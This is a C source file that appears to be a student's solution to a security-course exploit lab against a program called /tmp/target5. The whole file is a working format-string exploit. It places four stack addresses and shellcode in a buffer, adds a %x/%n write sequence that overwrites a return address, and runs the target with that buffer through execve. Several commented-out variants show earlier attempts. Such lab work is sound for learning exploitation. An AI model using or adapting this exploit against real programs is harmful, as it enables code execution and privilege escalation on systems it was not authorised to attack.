#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define EGG_SIZE 400

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[2] = NULL;
  env[0] = NULL;

  char egg[EGG_SIZE];
  char *ptr;
  long *ptr2;
  int i, l;

  memset (egg, '\x00', sizeof (egg));
  ptr = egg;

  //char *str ="\x2c\xfe\xff\xbf %x%x%x %n";
  char *popStack = "%x%x%x";
  char *dummyAddrPair = "\xff\xff\xff\xff\xcc\xfd\xff\xbf\xff\xff\xff\xff\xcd\xfd\xff\xbf\xff\xff\xff\xff\xce\xfd\xff\xbf\xff\xff\xff\xff\xcf\xfd\xff\xbf";
  char *writeStr = "%x%x%x%250x%n%164x%n%259x%n%192x%n";
  //char *str = "\xcc\xfd\xff\xbf\xff\xff\xff\xff\xcd\xfd\xff\xbf\xff\xff\xff\xff\xce\xfd\xff\xbf\xff\xff\xff\xff\xcf\xfd\xff\xbf\xff\xff\xff\xff%x%x%16x%n%16x%n%32x%n%64x%n";//%n%16u%n%32u%n%64u%n"; /* retloc, stack pop, writecode, shellcode */

  //char *dummyAddrPair = "\x38\xfc\xff\xbf\xcc\xfd\xff\xbf\xff\xff\xff\xff\xcd\xfd\xff\xbf\xff\xff\xff\xff\xce\xfd\xff\xbf\xff\xff\xff\xff\xcf\xfd\xff\xbf"; //"\xff\xff\xff\xff\xcc\xfd\xff\xbf\xff\xff\xff\xff\xcd\xfd\xff\xbf\xff\xff\xff\xff\xce\xfd\xff\xbf\xff\xff\xff\xff\xcf\xfd\xff\xbf";
  //char *writeStr = "%x%x%x%n%16x%n%32x%n%64x%n"; //"%x%x%x%16x%n%16x%n%32x%n%64x%n";                                                                                            
  //char *str = "\xcc\xfd\xff\xbf\xff\xff\xff\xff\xcd\xfd\xff\xbf\xff\xff\xff\xff\xce\xfd\xff\xbf\xff\xff\xff\xff\xcf\xfd\xff\xbf\xff\xff\xff\xff%x%x%16x%n%16x%n%32x%n%64x%n";//%n%16u%n%32u%n%64u%n"; /* retloc, stack pop, writecode, shellcode */                                                                   


  
  l = strlen(dummyAddrPair);
  memcpy(ptr, dummyAddrPair, l);
  
  for (i=0; i < strlen(shellcode); ++i){
    ptr[i+l] = shellcode[i];
  }

  l = strlen(dummyAddrPair) + strlen(shellcode);
  for (i=0; i < strlen(writeStr); ++i){
    ptr[i+l] = writeStr[i];
  }

  //  l = strlen (egg);

  //char *str2 = "%x%x%16u%n%16u%n%32u%n%64u%n";
  
  //for (i=0; i < strlen (str2); ++i){
  //  ptr[i+l] = str2[i];
  //}

  args[1] = egg;
  

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
